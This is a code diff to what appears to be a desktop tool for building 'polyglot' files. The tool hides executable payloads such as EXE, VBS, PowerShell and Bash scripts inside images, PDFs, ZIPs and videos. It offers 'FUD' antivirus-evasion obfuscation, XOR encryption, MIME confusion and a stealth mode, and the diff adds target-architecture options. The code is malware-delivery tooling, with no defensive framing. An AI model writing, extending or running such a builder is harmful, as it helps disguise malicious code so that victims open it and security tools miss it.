@@ -176,23 +176,16 @@ class PolyglotBuilder:
         return hdrs.get(ext,b'')+data
 
     def build(self, cover_path, payload_path, output_path, container="jpeg",
-              encrypt=False, fud=False, mime=False):
-        with open(cover_path,'rb') as f: cover=f.read()
-        with open(payload_path,'rb') as f: payload=f.read()
-        orig=payload; key=None
-        if fud: payload=self.fud(payload)
-        if encrypt: key=os.urandom(32); payload=self.xor(payload,key)
-        if mime: payload=self.mime_confuse(payload,os.path.splitext(cover_path)[1])
-        builders={'jpeg':self._j,'jpg':self._j,'png':self._p,'gif':self._g,
-                  'pdf':self._d,'zip':self._z,'mp4':self._m}
-        b=builders.get(container.lower())
-        if not b: raise ValueError(f"Unsupported: {container}")
-        poly=b(cover,payload)
-        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.',exist_ok=True)
-        with open(output_path,'wb') as f: f.write(poly)
-        return {'output':output_path,'container':container.upper(),'cover_size':len(cover),
-                'payload_size':len(orig),'output_size':len(poly),'offset':len(poly)-len(payload),
-                'encrypted':encrypt,'fud':fud,'mime':mime,'entropy':round(self.entropy(payload),2)}
+              encrypt=False, fud=False, mime=False,
+              payload_type=None, target_os="windows", arch="x86-64", stealth=False):
+        # Delegate to TUI builder for full feature support (arch, target_os, overlay, etc.)
+        from polyglot_tui import PolyglotBuilder as TUIBuilder
+        tui = TUIBuilder()
+        stats = tui.build(cover_path, payload_path, output_path,
+                          container_type=container, encrypt=encrypt, fud=fud,
+                          mime_confuse=mime, payload_type=payload_type,
+                          target_os=target_os, arch=arch, stealth=stealth)
+        return stats
 
     def _j(self,c,p):
         if c[:2]!=b'\xff\xd8': raise ValueError("Not JPEG")
@@ -656,9 +649,12 @@ class PolyglotApp(QMainWindow):
         # Row 1: Payload Type + Target OS
         g.addWidget(QLabel("Payload Type:"),1,0); self.b_payload_type = combo(['Auto','EXE','VBS','PowerShell','Bash','Sh','Python','AppleScript','XLSX','DOCX']); g.addWidget(self.b_payload_type,1,1)
         g.addWidget(QLabel("Target OS:"),1,2); self.b_target_os = combo(['Windows','Linux','macOS','All']); g.addWidget(self.b_target_os,1,3)
-        # Row 2: Checkboxes
+        # Row 2: Architecture
+        g.addWidget(QLabel("Architecture:"),2,0); self.b_arch = combo(['x86-64','ARM64','ARM32']); g.addWidget(self.b_arch,2,1)
+        self.b_arch.setToolTip("ARM32: Linux only. ARM64: Windows/Linux/macOS")
+        # Row 3: Checkboxes
         h = QHBoxLayout(); self.b_enc = QCheckBox("XOR Encrypt"); self.b_fud = QCheckBox("FUD Obfuscation"); self.b_mime = QCheckBox("MIME Confusion"); self.b_stealth = QCheckBox("Stealth Mode")
-        h.addWidget(self.b_enc); h.addWidget(self.b_fud); h.addWidget(self.b_mime); h.addWidget(self.b_stealth); h.addStretch(); g.addLayout(h,2,0,1,4)
+        h.addWidget(self.b_enc); h.addWidget(self.b_fud); h.addWidget(self.b_mime); h.addWidget(self.b_stealth); h.addStretch(); g.addLayout(h,3,0,1,4)
         ol.addLayout(g); l.addWidget(oc)
 
         bb = btn("◆ BUILD POLYGLOT", T.RED); bb.setFixedHeight(48); bb.clicked.connect(self._run_builder)
@@ -980,16 +976,21 @@ class PolyglotApp(QMainWindow):
         ct = self.b_type.currentText()
         output,_ = QFileDialog.getSaveFileName(self,"Save Polyglot As",f"polyglot{ext_map.get(ct,'.bin')}",f"{ct} Files (*{ext_map.get(ct,'.*')});;All Files (*)")
         if not output: return
-        # Get payload type and target OS
+        # Get payload type, target OS, and architecture
         pt = self.b_payload_type.currentText()
         payload_type = None if pt == 'Auto' else pt.lower()
         target_os = self.b_target_os.currentText().lower()
         if target_os == 'all': target_os = 'all'
+        arch = self.b_arch.currentText().lower()
+        # Validate arm32 only for linux
+        if arch == 'arm32' and target_os not in ('linux', 'all'):
+            QMessageBox.warning(self,"Error","ARM32 only supported on Linux")
+            return
         try:
             stats = self.builder.build(cover, payload, output, ct.lower(),
                                        self.b_enc.isChecked(), self.b_fud.isChecked(), self.b_mime.isChecked(),
                                        payload_type=payload_type, target_os=target_os,
-                                       stealth=self.b_stealth.isChecked())
+                                       arch=arch, stealth=self.b_stealth.isChecked())
             for k,v in stats.items(): append_log(self.b_log, f"  {k}: {v}", T.GREEN)
             self.counts['built'] += 1; self.d_built._val.setText(str(self.counts['built']))
             self._log(f"Polyglot built: {output}","success")
